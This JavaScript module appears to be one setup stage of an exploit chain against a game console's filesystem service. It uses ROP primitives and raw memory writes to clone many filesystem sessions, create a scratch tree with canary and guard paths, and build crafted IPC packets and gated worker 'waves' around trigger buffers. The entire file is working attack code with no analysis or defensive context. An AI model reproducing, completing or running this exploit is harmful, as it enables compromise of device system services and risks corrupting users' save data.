import coreRuntime from "../runtime.mjs";

const {F_Tick: F_Tick, GADGET_MEMCPY: GADGET_MEMCPY, allocPage: allocPage, allocWorkerResources: allocWorkerResources, applyCmifContext: applyCmifContext, borrowThreadScheduling: borrowThreadScheduling, buildWaveFrames: buildWaveFrames, call_rop: call_rop, cloneFsSession: cloneFsSession, cloneObject: cloneObject, cmifReply: cmifReply, createGateBlock: createGateBlock, findLastSendIndex: findLastSendIndex, findSendForPacket: findSendForPacket, getMountHandle: getMountHandle, hex32: hex32, ipcCommit: ipcCommit, ipcCreateDirectory: ipcCreateDirectory, ipcCreateFile: ipcCreateFile, ipcFreeSpace: ipcFreeSpace, ipcGetEntryType: ipcGetEntryType, log: log, normalizedPath: normalizedPath, openContentStorage: openContentStorage, openFspSession: openFspSession, prepPacket: prepPacket, removeScratchTree: removeScratchTree, sendIPC: sendIPC, write32: write32, write64: write64, write8: write8, writeStr: writeStr, writeXDesc: writeXDesc} = coreRuntime;

export async function borrowRawThreadScheduling() {
    let rawScheduling;
    rawScheduling = borrowThreadScheduling();
    if (!rawScheduling) {
        await log("FAIL: scheduling");
        return failedStep("raw-thread-scheduling-unavailable");
    }
    await log("SETUP: scheduling ok");
    return {
        ok: true,
        rawScheduling: rawScheduling
    };
}

export async function openFspSessions({helpers: helpers}) {
    let savedHandle;
    let temporaryHandle;
    let pktBuf;
    let rootSession;
    const handles = {
        auxiliaryStorageHandle: 0,
        candidateHandle: 0,
        extentTriggerHandle: 0,
        extraStorages: [],
        pinHandle: 0,
        rootClones: [],
        saveClones: [],
        storageHandle: 0,
        triggerHandle: 0
    };
    rootSession = openFspSession();
    if (!rootSession) {
        await log("FAIL: fsp-srv");
        return failedStep("fsp-session-open-failed");
    }
    pktBuf = allocPage(8192);
    const cleanupHandles = () => helpers.cleanup({
        ...handles,
        rootSession: rootSession,
        savedHandle: savedHandle,
        temporaryHandle: temporaryHandle
    });
    var saveMount = getMountHandle("save");
    if (!saveMount) {
        await log("FAIL: no save mount");
        cleanupHandles();
        return failedStep("save-mount-unavailable");
    }
    savedHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!savedHandle) {
        await log("FAIL: saved clone");
        cleanupHandles();
        return failedStep("save-filesystem-clone-failed");
    }
    temporaryHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!temporaryHandle) {
        await log("FAIL: temporary clone");
        cleanupHandles();
        return failedStep("temporary-filesystem-clone-failed");
    }
    return {
        ok: true,
        pktBuf: pktBuf,
        handles: {
            ...handles,
            rootSession: rootSession,
            savedHandle: savedHandle,
            temporaryHandle: temporaryHandle
        }
    };
}

export async function createScratchTree({config: config, helpers: helpers, handleResources: handleResources, savedHandle: savedHandle, temporaryHandle: temporaryHandle}) {
    let SCRATCH_DIR;
    let abortControlCanonical;
    let canaryPath;
    let dirtyFilePath;
    let segments;
    let selectedDir;
    let setupPath;
    let setupPkt;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        savedHandle: savedHandle,
        temporaryHandle: temporaryHandle
    });
    SCRATCH_DIR = "/hole";
    dirtyFilePath = SCRATCH_DIR + "/commit_data";
    canaryPath = normalizedPath(SCRATCH_DIR + "/canary", config.CANARY_LENGTH);
    selectedDir = SCRATCH_DIR + "/selected";
    var segmentSalt = Number(call_rop(F_Tick) & 0x1FFFFFFFFFFFn).toString(10);
    segments = [ "S0_" + segmentSalt, "S1_" + segmentSalt, "S2_" + segmentSalt ];
    var markerPath = SCRATCH_DIR + "/" + segments[0] + "/" + segments[1] + "/" + segments[2] + "/SPAN_MARKER";
    var scratchBefore = ipcGetEntryType(savedHandle, SCRATCH_DIR);
    if (scratchBefore.error !== 514) {
        await log("FAIL: /hole must be absent; restart the console and retry; result=" + hex32(scratchBefore.error));
        cleanupHandles();
        return failedStep("scratch-path-must-be-absent", "result=" + hex32(scratchBefore.error));
    }
    var spaceBefore = ipcFreeSpace(savedHandle, "/");
    if (spaceBefore.error !== 0 || spaceBefore.bytes <= config.DIRTY_FILE_SIZE + 5242880) {
        await log("FAIL: insufficient free space");
        cleanupHandles();
        return failedStep("insufficient-save-free-space", "result=" + hex32(spaceBefore.error) + "; bytes=" + spaceBefore.bytes + "; requiredMoreThan=" + (config.DIRTY_FILE_SIZE + 5242880));
    }
    var scratchRootResult = ipcCreateDirectory(savedHandle, SCRATCH_DIR);
    var scratchCommitResult = null;
    if (scratchRootResult === 0) {
        scratchCommitResult = ipcCommit(savedHandle);
    }
    if (scratchRootResult !== 0 || scratchCommitResult !== 0) {
        await log("FAIL: scratch root");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("scratch-root-create-or-commit-failed", "create=" + hex32(scratchRootResult) + "; commit=" + (scratchCommitResult === null ? "not-run" : hex32(scratchCommitResult)));
    }
    var dirtyFileResult = ipcCreateFile(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE);
    if (dirtyFileResult !== 0) {
        await log("FAIL: commit_data");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("dirty-file-create-failed", "result=" + hex32(dirtyFileResult));
    }
    var canaryParts = canaryPath.slice(1).split("/");
    var canaryOk = true;
    var canaryDirectories = 0;
    var canaryMkdirFailure = null;
    for (var i = 2; i < canaryParts.length; i++) {
        var rc = ipcCreateDirectory(savedHandle, "/" + canaryParts.slice(0, i).join("/"));
        if (rc !== 0 && (rc & 4194303) !== 1026) {
            canaryOk = false;
            canaryMkdirFailure = {
                index: i,
                pathLength: canaryParts.slice(0, i).join("/").length + 1,
                result: rc
            };
            break;
        }
        canaryDirectories++;
    }
    var canaryCreateResult = 4294967295;
    if (canaryOk) {
        canaryCreateResult = ipcCreateFile(savedHandle, canaryPath, 1);
    }
    if (!canaryOk || canaryCreateResult !== 0) {
        await log("FAIL: canary chain pathLen=" + canaryPath.length + " dirs=" + canaryDirectories + "/" + (canaryParts.length - 2) + (canaryMkdirFailure ? " mkdirAt=" + canaryMkdirFailure.index + " mkdirLen=" + canaryMkdirFailure.pathLength + " mkdirResult=" + hex32(canaryMkdirFailure.result) : "") + " create=" + hex32(canaryCreateResult));
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("canary-chain-create-failed", "pathLen=" + canaryPath.length + "; dirs=" + canaryDirectories + "/" + (canaryParts.length - 2) + (canaryMkdirFailure ? "; mkdirAt=" + canaryMkdirFailure.index + "; mkdirLen=" + canaryMkdirFailure.pathLength + "; mkdirResult=" + hex32(canaryMkdirFailure.result) : "") + "; create=" + hex32(canaryCreateResult));
    }
    setupPkt = allocPage(8192);
    setupPath = allocPage(4096);
    write8(setupPath, 0n);
    prepPacket(setupPkt, (4 | 1 << 16) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);
    var abortTransport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
    if (abortTransport !== 0) {
        await log("FAIL: abort control transport");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("abort-control-transport-failed", "transport=" + hex32(abortTransport));
    }
    abortControlCanonical = cmifReply(setupPkt).result & 4194303;
    var selectedDirectoryResult = ipcCreateDirectory(savedHandle, selectedDir);
    if (selectedDirectoryResult !== 0) {
        await log("FAIL: selected dir");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("selected-directory-create-failed", "result=" + hex32(selectedDirectoryResult));
    }
    var running = SCRATCH_DIR;
    for (var i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        var spanDirectoryResult = ipcCreateDirectory(temporaryHandle, running);
        if (spanDirectoryResult !== 0) {
            await log("FAIL: span dir " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR);
            cleanupHandles();
            return failedStep("span-directory-create-failed", "index=" + i + "; result=" + hex32(spanDirectoryResult));
        }
    }
    var spanMarkerResult = ipcCreateFile(temporaryHandle, markerPath, 1);
    if (spanMarkerResult !== 0) {
        await log("FAIL: SPAN_MARKER");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("span-marker-create-failed", "result=" + hex32(spanMarkerResult));
    }
    await log("SETUP: scratch tree ready canaryPathLen=" + canaryPath.length + " dirs=" + canaryDirectories + " create=" + hex32(canaryCreateResult));
    return {
        ok: true,
        SCRATCH_DIR: SCRATCH_DIR,
        abortControlCanonical: abortControlCanonical,
        canaryPath: canaryPath,
        canaryDirectories: canaryDirectories,
        canaryCreateResult: canaryCreateResult,
        dirtyFilePath: dirtyFilePath,
        segments: segments,
        selectedDir: selectedDir,
        setupPath: setupPath,
        setupPkt: setupPkt
    };
}

export async function openStorageAndClones({helpers: helpers, handleResources: handleResources, SCRATCH_DIR: SCRATCH_DIR, rootSession: rootSession, savedHandle: savedHandle}) {
    let storageHandle;
    const saveClones = [];
    const rootClones = [];
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        storageHandle: storageHandle,
        saveClones: saveClones,
        rootClones: rootClones
    });
    storageHandle = openContentStorage(rootSession);
    if (!storageHandle) {
        await log("FAIL: primary IStorage");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("primary-storage-open-failed");
    }
    for (var i = 0; i < 6; i++) {
        var h = cloneFsSession(savedHandle);
        if (!h) {
            await log("FAIL: save clone " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR);
            cleanupHandles();
            return failedStep("save-filesystem-clone-failed", "index=" + i);
        }
        saveClones.push(h);
    }
    for (var i = 0; i < 4; i++) {
        var h = cloneFsSession(rootSession);
        if (!h) {
            await log("FAIL: root clone " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR);
            cleanupHandles();
            return failedStep("root-filesystem-clone-failed", "index=" + i);
        }
        rootClones.push(h);
    }
    return {
        ok: true,
        rootClones: rootClones,
        saveClones: saveClones,
        storageHandle: storageHandle
    };
}

export async function openTriggerHandles({helpers: helpers, handleResources: handleResources, SCRATCH_DIR: SCRATCH_DIR, savedHandle: savedHandle, temporaryHandle: temporaryHandle}) {
    let triggerHandle;
    let extentTriggerHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        triggerHandle: triggerHandle,
        extentTriggerHandle: extentTriggerHandle
    });
    triggerHandle = cloneFsSession(savedHandle);
    extentTriggerHandle = cloneFsSession(temporaryHandle);
    if (!triggerHandle || !extentTriggerHandle) {
        await log("FAIL: trigger clones");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("trigger-handle-clone-failed", "trigger=" + Boolean(triggerHandle) + "; extent=" + Boolean(extentTriggerHandle));
    }
    return {
        ok: true,
        extentTriggerHandle: extentTriggerHandle,
        triggerHandle: triggerHandle
    };
}

export function allocatePacketBuffers({config: config, SCRATCH_DIR: SCRATCH_DIR, canaryPath: canaryPath}) {
    let canaryBufMem;
    let extentTotal;
    let fillerBuf0;
    let fillerBuf1;
    let fillerDst;
    let fillerSrc;
    let fragmentBufs;
    let guardBuf0;
    let guardBuf1;
    let guardPath;
    let guardPathC;
    let triggerBuf;
    extentTotal = config.EXTENT_SIZE + 1;
    triggerBuf = allocPage(8192);
    fragmentBufs = [];
    for (var i = 0; i < 4; i++) fragmentBufs.push(allocPage(8192));
    canaryBufMem = allocPage(4096);
    writeStr(canaryBufMem, canaryPath);
    guardPath = normalizedPath(SCRATCH_DIR + "/absent", 768);
    guardPathC = guardPath.slice(0, -1) + "C";
    guardBuf0 = allocPage(4096);
    guardBuf1 = allocPage(4096);
    writeStr(guardBuf0, guardPath);
    writeStr(guardBuf1, guardPathC);
    fillerSrc = "/NS2_SRC00000000";
    fillerDst = normalizedPath(SCRATCH_DIR + "/page_absent", 2031);
    fillerBuf0 = allocPage(4096);
    fillerBuf1 = allocPage(4096);
    writeStr(fillerBuf0, fillerSrc);
    writeStr(fillerBuf1, fillerDst);
    return {
        ok: true,
        canaryBufMem: canaryBufMem,
        extentTotal: extentTotal,
        fillerBuf0: fillerBuf0,
        fillerBuf1: fillerBuf1,
        fillerDst: fillerDst,
        fillerSrc: fillerSrc,
        fragmentBufs: fragmentBufs,
        guardBuf0: guardBuf0,
        guardBuf1: guardBuf1,
        guardPath: guardPath,
        guardPathC: guardPathC,
        triggerBuf: triggerBuf
    };
}

export function buildIpcRequests({config: config, canaryBufMem: canaryBufMem, canaryPath: canaryPath, fillerBuf0: fillerBuf0, fillerBuf1: fillerBuf1, fragmentBufs: fragmentBufs, guardBuf0: guardBuf0, guardBuf1: guardBuf1, triggerBuf: triggerBuf}) {
    let REQ;
    let clearPkt;
    let pinPkt;
    let prePkt;
    REQ = [];
    for (var i = 0; i < 13; i++) REQ.push(allocPage(8192));
    prepPacket(REQ[0], 4, 8, [ [ 16, 1229145683 ], [ 24, 10 ] ]);
    var bottleneckRecv = allocPage(config.WAVE_READ_SIZE + 8192);
    prepPacket(REQ[1], (4 | 1 << 24) >>> 0, 12, []);
    write32(REQ[1] + 8n, BigInt(config.WAVE_READ_SIZE));
    write32(REQ[1] + 12n, BigInt(Number(bottleneckRecv & 0xFFFFFFFFn)));
    write32(REQ[1] + 16n, BigInt((1 | Number(bottleneckRecv >> 36n & 7n) << 2 | Number(bottleneckRecv >> 32n & 15n) << 28) >>> 0));
    write32(REQ[1] + 0x20n, 0x49434653n);
    write32(REQ[1] + 0x28n, 0n);
    write64(REQ[1] + 0x30n, 0n);
    write64(REQ[1] + 0x38n, BigInt(config.WAVE_READ_SIZE));
    for (var i = 0; i < 4; i++) {
        prepPacket(REQ[2 + i], (4 | 1 << 16) >>> 0, 8, [ [ 16, 1229145683 ], [ 24, 1002 ] ]);
        writeXDesc(REQ[2 + i], 8, fragmentBufs[i], config.SLOT_SIZE);
    }
    prepPacket(REQ[6], (4 | 1 << 16) >>> 0, 8, [ [ 16, 1229145683 ], [ 24, 7 ] ]);
    writeXDesc(REQ[6], 8, canaryBufMem, canaryPath.length + 1);
    for (var idx = 7; idx <= 8; idx++) {
        prepPacket(REQ[idx], (4 | 2 << 16) >>> 0, 8, [ [ 32, 1229145683 ], [ 40, 5 ] ]);
        writeXDesc(REQ[idx], 8, fillerBuf0, 16);
        writeXDesc(REQ[idx], 16, fillerBuf1, 2032, 1);
    }
    pinPkt = allocPage(8192);
    clearPkt = allocPage(8192);
    prePkt = allocPage(8192);
    prepPacket(pinPkt, 4, 8, [ [ 16, 1229145683 ], [ 24, 200 ] ]);
    write32(pinPkt, 6n);
    write32(pinPkt + 20n, 1n);
    write32(pinPkt + 28n, 9n);
    prepPacket(clearPkt, 4, 8, [ [ 16, 1229145683 ], [ 24, 1009 ] ]);
    write32(clearPkt, 6n);
    write32(clearPkt + 20n, 1n);
    write32(clearPkt + 28n, 9n);
    prepPacket(prePkt, 4, 8, [ [ 16, 1229145683 ], [ 24, 1009 ] ]);
    write32(prePkt, 6n);
    write32(prePkt + 20n, 1n);
    write32(prePkt + 28n, 9n);
    prepPacket(REQ[9], 4, 8, []);
    write8(REQ[9] + 16n, 2n);
    write32(REQ[9] + 20n, 0n);
    write32(REQ[9] + 28n, 0n);
    prepPacket(REQ[10], (4 | 2 << 16) >>> 0, 8, [ [ 32, 1229145683 ], [ 40, 5 ] ]);
    writeXDesc(REQ[10], 8, guardBuf0, 769);
    writeXDesc(REQ[10], 16, guardBuf1, 769, 1);
    prepPacket(REQ[11], (4 | 2 << 16) >>> 0, 8, [ [ 32, 1229145683 ], [ 40, 5 ] ]);
    writeXDesc(REQ[11], 8, guardBuf0, 769);
    writeXDesc(REQ[11], 16, guardBuf1, 769, 1);
    prepPacket(REQ[12], (4 | 1 << 16) >>> 0, 8, [ [ 16, 1229145683 ], [ 24, 7 ] ]);
    writeXDesc(REQ[12], 8, triggerBuf, config.SLOT_SIZE);
    return {
        ok: true,
        REQ: REQ,
        clearPkt: clearPkt,
        pinPkt: pinPkt,
        prePkt: prePkt
    };
}

export async function checkPathPair({helpers: helpers, handleResources: handleResources, SCRATCH_DIR: SCRATCH_DIR, fillerDst: fillerDst, fillerSrc: fillerSrc, guardPath: guardPath, guardPathC: guardPathC, rootSession: rootSession, savedHandle: savedHandle}) {
    let auxiliaryStorageHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        auxiliaryStorageHandle: auxiliaryStorageHandle
    });
    var fillerControlOk = await helpers.checkPathPairQuiet(fillerSrc, 16, fillerDst, 2032, {
        savedHandle: savedHandle
    });
    var guardControlOk = fillerControlOk ? await helpers.checkPathPairQuiet(guardPath, 769, guardPathC, 769, {
        savedHandle: savedHandle
    }) : null;
    var controlOk = Boolean(fillerControlOk && guardControlOk);
    if (!controlOk) {
        await log("FAIL: path-pair control");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("path-pair-control-failed", "filler=" + Boolean(fillerControlOk) + "; guard=" + (guardControlOk === null ? "not-run" : Boolean(guardControlOk)));
    }
    auxiliaryStorageHandle = openContentStorage(rootSession);
    if (!auxiliaryStorageHandle) {
        await log("FAIL: auxiliary IStorage");
        removeScratchTree(savedHandle, SCRATCH_DIR);
        cleanupHandles();
        return failedStep("auxiliary-storage-open-failed");
    }
    return {
        ok: true,
        auxiliaryStorageHandle: auxiliaryStorageHandle
    };
}

export function applyCmifContexts({REQ: REQ, clearPkt: clearPkt, pinPkt: pinPkt, prePkt: prePkt}) {
    for (var i = 0; i < 13; i++) {
        var ctx = i === 0 || i >= 2 && i <= 5 ? 3 : 9;
        if (i !== 9) applyCmifContext(REQ[i], ctx);
    }
    applyCmifContext(pinPkt, 9);
    applyCmifContext(clearPkt, 9);
    applyCmifContext(prePkt, 9);
    return {
        ok: true
    };
}

export async function prepareWaveInfrastructure({helpers: helpers, REQ: REQ, clearPkt: clearPkt, pinPkt: pinPkt, prePkt: prePkt, rootClones: rootClones, saveClones: saveClones, storageHandle: storageHandle, triggerBuf: triggerBuf, triggerHandle: triggerHandle, config: config, rootSession: rootSession}) {
    let clearSendIndex;
    let gates;
    let pinSendIndex;
    let preSendIndex;
    let roleHandles;
    let sendIndices;
    let waveData;
    let waveExtra;
    let workerResources;
    roleHandles = [ saveClones[0], storageHandle, rootClones[0], rootClones[1], rootClones[2], rootClones[3], saveClones[1], saveClones[2], saveClones[3], 0, saveClones[4], saveClones[5], triggerHandle ];
    gates = createGateBlock();
    var plans = helpers.buildPlans({
        config: config,
        REQ: REQ,
        clearPkt: clearPkt,
        gates: gates,
        pinPkt: pinPkt,
        prePkt: prePkt,
        roleHandles: roleHandles,
        rootSession: rootSession,
        triggerBuf: triggerBuf
    });
    sendIndices = plans.map(findLastSendIndex);
    pinSendIndex = findSendForPacket(plans[9], pinPkt);
    clearSendIndex = findSendForPacket(plans[9], clearPkt);
    preSendIndex = findSendForPacket(plans[9], prePkt);
    waveData = buildWaveFrames(plans, REQ, triggerBuf, sendIndices);
    workerResources = allocWorkerResources(13);
    var pinBk = allocPage(8192);
    call_rop(GADGET_MEMCPY, pinBk, pinPkt, 0x1000n);
    var clearBk = allocPage(8192);
    call_rop(GADGET_MEMCPY, clearBk, clearPkt, 0x1000n);
    var preBk = allocPage(8192);
    call_rop(GADGET_MEMCPY, preBk, prePkt, 0x1000n);
    waveExtra = {
        packets: [ {
            pkt: pinPkt,
            backup: pinBk
        }, {
            pkt: clearPkt,
            backup: clearBk
        }, {
            pkt: prePkt,
            backup: preBk
        } ],
        triggerBuf: triggerBuf,
        triggerFirstByte: 47
    };
    await log("SETUP: " + waveData.frames.length + " workers ready");
    return {
        ok: true,
        clearSendIndex: clearSendIndex,
        gates: gates,
        pinSendIndex: pinSendIndex,
        preSendIndex: preSendIndex,
        roleHandles: roleHandles,
        sendIndices: sendIndices,
        waveData: waveData,
        waveExtra: waveExtra,
        workerResources: workerResources
    };
}

function failedStep(failureReason, failureDetail) {
    return {
        ok: false,
        failureReason: failureReason,
        ...failureDetail ? {
            failureDetail: failureDetail
        } : {}
    };
}
